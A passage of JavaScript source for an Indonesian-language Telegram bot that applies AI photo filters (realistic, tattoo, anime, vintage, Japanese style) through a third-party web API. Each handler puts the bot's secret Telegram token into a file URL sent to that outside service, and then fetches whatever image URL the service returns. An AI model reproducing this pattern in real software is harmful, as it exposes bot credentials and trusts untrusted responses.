errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎨 HANDLER UNTUK FOTO DENGAN CAPTION /TOREAL
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/toreal') {
const messageText = 'PHOTO_CAPTION: /toreal';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter realistic AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/toreal?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🎨 Realistic AI Gemini style!</blockquote>\n` +
`<i>Filter realistic AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🎨 Realistic AI Gemini style!</blockquote>\n` +
`<i>Filter realistic AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Toreal caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🧿 TOTATO COMMAND - AI TATTOO FILTER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/totato$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/totato';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/totato</code>\n\n` +
`<i>Balas foto yang ingin ditambahkan tato.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Menambahkan tato dengan AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/totato?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers['content-type'] || '';
if (contentType.startsWith('image/')) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🧿 Tato berhasil ditambahkan!</blockquote>\n` +
`<i>Filter tato AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🧿 Tato berhasil ditambahkan!</blockquote>\n` +
`<i>Filter tato AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Totato error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🧿 HANDLER UNTUK FOTO DENGAN CAPTION /TOTATO
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/totato') {
const messageText = 'PHOTO_CAPTION: /totato';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Menambahkan tato dengan AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/totato?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers['content-type'] || '';
if (contentType.startsWith('image/')) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🧿 Tato berhasil ditambahkan!</blockquote>\n` +
`<i>Filter tato AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🧿 Tato berhasil ditambahkan!</blockquote>\n` +
`<i>Filter tato AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Totato caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎨 TOANIME COMMAND - AI ANIME FILTER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/toanime$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/toanime';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/toanime</code>\n\n` +
`<i>Balas foto yang ingin diubah jadi anime.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter anime AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/toanime?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🎨 Foto kamu berhasil diubah jadi anime!</blockquote>\n` +
`<i>Filter anime AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🎨 Foto kamu berhasil jadi anime!</blockquote>\n` +
`<i>Filter anime AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Toanime error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎨 HANDLER UNTUK FOTO DENGAN CAPTION /TOANIME
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/toanime') {
const messageText = 'PHOTO_CAPTION: /toanime';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter anime AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/toanime?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🎨 Foto kamu berhasil diubah jadi anime!</blockquote>\n` +
`<i>Filter anime AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🎨 Foto kamu berhasil jadi anime!</blockquote>\n` +
`<i>Filter anime AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Toanime caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📼 TOVINTAGE COMMAND - AI VINTAGE FILTER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/tovintage$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/tovintage';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/tovintage</code>\n\n` +
`<i>Balas foto yang ingin diubah jadi gaya vintage.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter vintage...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tovintage?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers['content-type'] || '';
if (contentType.startsWith('image/')) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>📼 Vintage mode aktif!</blockquote>\n` +
`<i>Filter vintage berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>📼 Vintage mode aktif!</blockquote>\n` +
`<i>Filter vintage berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tovintage error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📼 HANDLER UNTUK FOTO DENGAN CAPTION /TOVINTAGE
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/tovintage') {
const messageText = 'PHOTO_CAPTION: /tovintage';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter vintage...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tovintage?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers['content-type'] || '';
if (contentType.startsWith('image/')) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>📼 Vintage mode aktif!</blockquote>\n` +
`<i>Filter vintage berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>📼 Vintage mode aktif!</blockquote>\n` +
`<i>Filter vintage berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tovintage caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🗾 TOJEPANG COMMAND - AI JAPAN STYLE FILTER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/tojepang$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/tojepang';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/tojepang</code>\n\n` +
`<i>Balas foto yang ingin diubah jadi gaya Jepang.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter gaya Jepang...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tojepang?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🗾 Kamu sudah di Jepang!</blockquote>\n` +
`<i>Filter gaya Jepang berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🗾 Kamu sudah di Jepang!</blockquote>\n` +
`<i>Filter gaya Jepang berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tojepang error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🗾 HANDLER UNTUK FOTO DENGAN CAPTION /TOJEPANG
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/tojepang') {
const messageText = 'PHOTO_CAPTION: /tojepang';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter gaya Jepang...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tojepang?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🗾 Kamu sudah di Jepang!</blockquote>\n` +
`<i>Filter gaya Jepang berhasil diterapkan.</i>`,
